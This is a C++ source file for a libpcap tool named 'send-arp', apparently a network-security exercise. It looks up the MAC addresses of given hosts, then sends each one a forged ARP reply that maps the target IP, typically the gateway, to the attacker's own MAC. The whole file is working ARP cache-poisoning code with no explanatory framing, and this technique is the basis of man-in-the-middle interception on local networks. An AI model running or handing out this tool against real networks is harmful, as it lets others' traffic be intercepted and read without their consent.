#include <cstdio>
#include <pcap.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netpacket/packet.h>
#include <unistd.h>
#include <ctime>
#include <unordered_map>
#include <set>
#include <vector>
#include <utility>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool get_my_mac_ip(const char* dev, Mac& mac, Ip& ip) {
    struct ifaddrs* ifap, * ifa;
    struct sockaddr_in* sa;
    struct sockaddr_ll* sll;

    if (getifaddrs(&ifap) != 0) {
        perror("getifaddrs");
        return false;
    }

    for (ifa = ifap; ifa != nullptr; ifa = ifa->ifa_next) {
        if (strcmp(ifa->ifa_name, dev) == 0) {
            if (ifa->ifa_addr->sa_family == AF_INET) {
                sa = (struct sockaddr_in*)ifa->ifa_addr;
                ip = Ip(ntohl(sa->sin_addr.s_addr));
            }
            else if (ifa->ifa_addr->sa_family == AF_PACKET) {
                sll = (struct sockaddr_ll*)ifa->ifa_addr;
                mac = Mac(sll->sll_addr);
            }
        }
    }

    freeifaddrs(ifap);
    return true;
}


Mac get_mac_of_sender(pcap_t* handle, const char* dev, Mac my_mac, Ip my_ip, Ip sender_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

	time_t start_time = time(nullptr);
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet_data;
        int res = pcap_next_ex(handle, &header, &packet_data);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthArpPacket* recv_packet = (EthArpPacket*)packet_data;


        if (recv_packet->eth_.type() == 0x0806 && 
			recv_packet->arp_.op() == 0x02 &&
			Ip(recv_packet->arp_.sip()) == sender_ip) {
            	return recv_packet->arp_.smac();
		}

		if (difftime(time(nullptr), start_time) > 5) {
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
            start_time = time(nullptr);
        }
    }
    return Mac::nullMac();
}

void send_arp_reply(pcap_t* handle, Mac my_mac, Ip target_ip, Mac sender_mac, Ip sender_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

    if (argc % 2 != 0) {
        fprintf(stderr, "Invalid number of arguments\n");
        return -1;
    }

    char* dev = argv[1];

    Mac my_mac;
    Ip my_ip;
    if (!get_my_mac_ip(dev, my_mac, my_ip)) {
        fprintf(stderr, "Failed to get MAC and IP address of interface %s\n", dev);
        return -1;
    }
	printf("My MAC address: %s\n", std::string(my_mac).c_str());
	printf("My IP address: %s\n", std::string(my_ip).c_str());

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    std::unordered_map<Ip, Mac> sender_ip_mac_map;
    std::vector<std::pair<Ip, Ip>> sender_target_pairs;

    for(int i = 2; i < argc; i += 2) {
        Ip sender_ip(argv[i]);
        Ip target_ip(argv[i+1]);
        sender_target_pairs.push_back(std::make_pair(sender_ip, target_ip));
        sender_ip_mac_map[sender_ip] = Mac::nullMac();
    }

    for (auto& entry : sender_ip_mac_map) {
        Ip sender_ip = entry.first;
        printf("Getting MAC for Sender IP: %s\n", std::string(sender_ip).c_str());
        Mac sender_mac = get_mac_of_sender(handle, dev, my_mac, my_ip, sender_ip);
        if (sender_mac == Mac::nullMac()) {
            fprintf(stderr, "Failed to get MAC address for %s\n", std::string(sender_ip).c_str());
        } else {
            printf("Sender IP: %s has MAC: %s\n", std::string(sender_ip).c_str(), std::string(sender_mac).c_str());
            sender_ip_mac_map[sender_ip] = sender_mac;
        }
    }

    for (auto& pair : sender_target_pairs) {
        Ip sender_ip = pair.first;
        Ip target_ip = pair.second;
        Mac sender_mac = sender_ip_mac_map[sender_ip];
        if (sender_mac == Mac::nullMac()) {
            fprintf(stderr, "Skipping ARP reply to %s due to unknown MAC address.\n", std::string(sender_ip).c_str());
            continue;
        }
        send_arp_reply(handle, my_mac, target_ip, sender_mac, sender_ip);
    }

    pcap_close(handle);

    return 0;
}
